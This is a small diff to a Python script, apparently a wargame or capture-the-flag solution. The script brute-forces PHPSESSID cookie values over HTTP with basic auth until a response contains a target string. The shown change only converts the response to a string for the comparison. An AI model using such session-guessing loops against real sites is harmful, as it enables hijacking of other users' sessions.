@@ -14,7 +14,7 @@ for i in range(maxid):
 	c = dict(PHPSESSID=str(i))
 	httpreq = requests.get(url, auth=(user, passwd), cookies=c)
 	print (i)
-	if match in httpreq.content:
+	if match in str(httpreq.content):
 		print (httpreq.content)
 		break
 
